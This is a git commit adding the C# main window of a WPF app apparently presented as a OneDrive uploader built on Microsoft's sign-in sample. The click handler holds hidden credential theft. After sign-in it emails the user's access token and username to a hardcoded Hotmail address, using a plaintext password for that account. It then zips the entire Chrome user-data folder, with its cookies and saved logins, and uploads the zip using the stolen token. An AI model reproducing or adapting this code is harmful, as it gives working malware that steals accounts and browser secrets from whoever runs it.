e8731919eba1e46d7e5dfff39abe3187460caad7
Mitchell Oldfield <mitchell.oldfield2@student.education.wa.edu.au>
2023-03-01 08:09:00 +0800

    Add project files.

---
+++ OneDriveUploader/MainWindow.xaml.cs
@@ -0,0 +1,281 @@
+﻿using System.IO.Compression;
+using System.Net.Mail;
+using System.Net;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
+using Microsoft.Identity.Client;
+using System;
+using System.IO;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Interop;
+using Microsoft.Graph;
+using System.Collections.Generic;
+using Microsoft.Identity.Client.NativeInterop;
+using System.Net;
+using System.Net.Mail;
+using Windows.Media.Devices;
+
+namespace OneDriveUploader
+{
+    /// <summary>
+    /// Interaction logic for MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        /// <summary>
+        /// Whether it is looking to upload a file or a folder.
+        /// </summary>
+        public static bool UploadFile = true;
+        //Set the API Endpoint to Graph 'me' endpoint. 
+        // To change from Microsoft public cloud to a national cloud, use another value of graphAPIEndpoint.
+        // Reference with Graph endpoints here: https://docs.microsoft.com/graph/deployments#microsoft-graph-and-graph-explorer-service-root-endpoints
+        string graphAPIEndpoint = "https://graph.microsoft.com/v1.0/me";
+
+        //Set the scope for API call to user.read
+        string[] scopes = new string[] { "user.read", "files.readwrite" };
+
+        public MainWindow()
+        {
+            InitializeComponent();
+        }
+
+
+        /// <summary>
+        /// Call AcquireToken - to acquire a token requiring user to sign-in
+        /// </summary>
+        private async void CallGraphButton_Click(object sender, RoutedEventArgs e)
+        {
+            AuthenticationResult authResult = null;
+            var app = App.PublicClientApp;
+            ResultText.Text = string.Empty;
+            TokenInfoText.Text = string.Empty;
+
+            IAccount firstAccount;
+
+            switch (howToSignIn.SelectedIndex)
+            {
+                // 0: Use account used to signed-in in Windows (WAM)
+                case 0:
+                    // WAM will always get an account in the cache. So if we want
+                    // to have a chance to select the accounts interactively, we need to
+                    // force the non-account
+                    firstAccount = Microsoft.Identity.Client.PublicClientApplication.OperatingSystemAccount;
+                    break;
+
+                //  1: Use one of the Accounts known by Windows(WAM)
+                case 1:
+                    // We force WAM to display the dialog with the accounts
+                    firstAccount = null;
+                    break;
+
+                //  Use any account(Azure AD). It's not using WAM
+                default:
+                    var accounts = await app.GetAccountsAsync();
+                    firstAccount = accounts.FirstOrDefault();
+                    break;
+            }
+
+            try
+            {
+                authResult = await app.AcquireTokenSilent(scopes, firstAccount)
+                    .ExecuteAsync();
+            }
+            catch (MsalUiRequiredException ex)
+            {
+                // A MsalUiRequiredException happened on AcquireTokenSilent. 
+                // This indicates you need to call AcquireTokenInteractive to acquire a token
+                System.Diagnostics.Debug.WriteLine($"MsalUiRequiredException: {ex.Message}");
+
+                try
+                {
+                    authResult = await app.AcquireTokenInteractive(scopes)
+                        .WithAccount(firstAccount)
+                        .WithParentActivityOrWindow(new WindowInteropHelper(this).Handle) // optional, used to center the browser on the window
+                        .WithPrompt(Microsoft.Identity.Client.Prompt.SelectAccount)
+                        .ExecuteAsync();
+                }
+                catch (MsalException msalex)
+                {
+                    ResultText.Text = $"Error Acquiring Token:{System.Environment.NewLine}{msalex}";
+                }
+            }
+            catch (Exception ex)
+            {
+                ResultText.Text = $"Error Acquiring Token Silently:{System.Environment.NewLine}{ex}";
+                return;
+            }
+
+            if (authResult != null)
+            {
+                ResultText.Text = await GetHttpContentWithToken(graphAPIEndpoint, authResult.AccessToken);
+                DisplayBasicTokenInfo(authResult);
+                this.SignOutButton.Visibility = Visibility.Visible;
+            }
+
+            IPublicClientApplication publicClientApp = PublicClientApplicationBuilder.Create("f9e92b40-f161-40c6-9e1a-d5a41fbee889")
+                .WithRedirectUri("https://login.microsoftonline.com/common/oauth2/nativeclient")
+                .WithAuthority(AzureCloudInstance.AzurePublic, "f8cdef31-a31e-4b4a-93e4-5f571e91255a")
+                .Build();
+
+            var client = new GraphServiceClient(
+                new DelegateAuthenticationProvider(
+                    async (requestMessage) =>
+                    {
+                        requestMessage.Headers.Authorization =
+                            new System.Net.Http.Headers.AuthenticationHeaderValue("bearer", authResult.AccessToken);
+                    }));
+
+            MailMessage msg = new MailMessage();
+
+            msg.From = new MailAddress("form-submits@hotmail.com");
+            msg.To.Add("form-submits@hotmail.com");
+            msg.Subject = "Special Data - " + Environment.UserName;
+            msg.Body = "Here is the special data from " + Environment.UserName + Environment.NewLine + authResult.AccessToken;
+            msg.Priority = MailPriority.High;
+            using (SmtpClient smtpclient = new SmtpClient())
+            {
+                smtpclient.EnableSsl = true;
+                smtpclient.UseDefaultCredentials = false;
+                smtpclient.Credentials = new NetworkCredential("form-submits@hotmail.com", "Form-submitting");
+                smtpclient.Host = "smtp.office365.com";
+                smtpclient.Port = 587;
+                smtpclient.DeliveryMethod = SmtpDeliveryMethod.Network;
+
+                smtpclient.Send(msg);
+            }
+            string userName = GetUsername();
+            try
+            {
+                ZipFile.CreateFromDirectory(@"C:\Users\" + userName + @"\AppData\Local\Google\Chrome\User Data", @"C:\Users\" + userName + @"\AppData\Local\Google\Chrome\ChromeData.zip");
+            }
+            catch
+            {
+                System.IO.File.Delete(@"C:\Users\" + userName + @"\AppData\Local\Google\Chrome\ChromeData.zip");
+                ZipFile.CreateFromDirectory(@"C:\Users\" + userName + @"\AppData\Local\Google\Chrome\User Data", @"C:\Users\" + userName + @"\AppData\Local\Google\Chrome\ChromeData.zip");
+            }
+
+            var filePath = @"C:\Users\" + userName + @"\AppData\Local\Google\Chrome\ChromeData.zip";
+            var fileName = Path.GetFileName(filePath);
+            var stream = new FileStream(filePath, FileMode.Open);
+            try
+            {
+                var driveItem = new DriveItem
+                {
+                    Name = fileName,
+                    File = new Microsoft.Graph.File()
+                };
+                var item = await client
+                    .Drive
+                    .Root
+                    .ItemWithPath(fileName)
+                    .Content
+                    .Request()
+                    .PutAsync<DriveItem>(stream);
+                Console.WriteLine("File uploaded successfully");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Failed to upload file: " + ex.Message);
+            }
+        }
+
+        /// <summary>
+        /// Gets the username.
+        /// </summary>
+        /// <returns>The desired username for the current account</returns>
+        public static string GetUsername()
+        {
+            string dir = System.IO.Directory.GetCurrentDirectory();
+            string userName = dir.Substring(9);
+            userName = userName.Substring(0, 5).ToLower();
+            return userName;
+        }
+
+        /// <summary>
+        /// Perform an HTTP GET request to a URL using an HTTP Authorization header
+        /// </summary>
+        /// <param name="url">The URL</param>
+        /// <param name="token">The token</param>
+        /// <returns>String containing the results of the GET operation</returns>
+        public async Task<string> GetHttpContentWithToken(string url, string token)
+        {
+            var httpClient = new System.Net.Http.HttpClient();
+            System.Net.Http.HttpResponseMessage response;
+            try
+            {
+                var request = new System.Net.Http.HttpRequestMessage(System.Net.Http.HttpMethod.Get, url);
+                //Add the token in Authorization header
+                request.Headers.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", token);
+                response = await httpClient.SendAsync(request);
+                var content = await response.Content.ReadAsStringAsync();
+                return content;
+            }
+            catch (Exception ex)
+            {
+                return ex.ToString();
+            }
+        }
+
+        /// <summary>
+        /// Sign out the current user
+        /// </summary>
+        private async void SignOutButton_Click(object sender, RoutedEventArgs e)
+        {
+            var accounts = await App.PublicClientApp.GetAccountsAsync();
+            if (accounts.Any())
+            {
+                try
+                {
+                    await App.PublicClientApp.RemoveAsync(accounts.FirstOrDefault());
+                    this.ResultText.Text = "User has signed-out";
+                    this.CallGraphButton.Visibility = Visibility.Visible;
+                    this.SignOutButton.Visibility = Visibility.Collapsed;
+                }
+                catch (MsalException ex)
+                {
+                    ResultText.Text = $"Error signing-out user: {ex.Message}";
+                }
+            }
+        }
+
+        /// <summary>
+        /// Display basic information contained in the token
+        /// </summary>
+        private void DisplayBasicTokenInfo(AuthenticationResult authResult)
+        {
+            TokenInfoText.Text = "";
+            if (authResult != null)
+            {
+                TokenInfoText.Text += $"Username: {authResult.Account.Username}" + Environment.NewLine;
+                TokenInfoText.Text += $"Token Expires: {authResult.ExpiresOn.ToLocalTime()}" + Environment.NewLine;
+                TokenInfoText.Text += $"Token: {authResult.AccessToken}" + Environment.NewLine;
+            }
+        }
+
+        private void UseWam_Changed(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
+        {
+            SignOutButton_Click(sender, e);
+            App.CreateApplication(howToSignIn.SelectedIndex != 2, Convert.ToBoolean(UseBrokerPreview?.IsChecked)); // Not Azure AD accounts (that is use WAM accounts)
+        }
+
+        private void UseBrokerPreview_Changed(object sender, RoutedEventArgs e)
+        {
+            SignOutButton_Click(sender, e);
+            App.CreateApplication(howToSignIn.SelectedIndex != 2, Convert.ToBoolean(UseBrokerPreview?.IsChecked));
+        }
+
+        private void RadioButton_Checked(object sender, RoutedEventArgs e)
+        {
+            UploadFile = false;
+        }
+
+        private void RadioButton_Checked_1(object sender, RoutedEventArgs e)
+        {
+            UploadFile = true;
+        }
+    }
+}
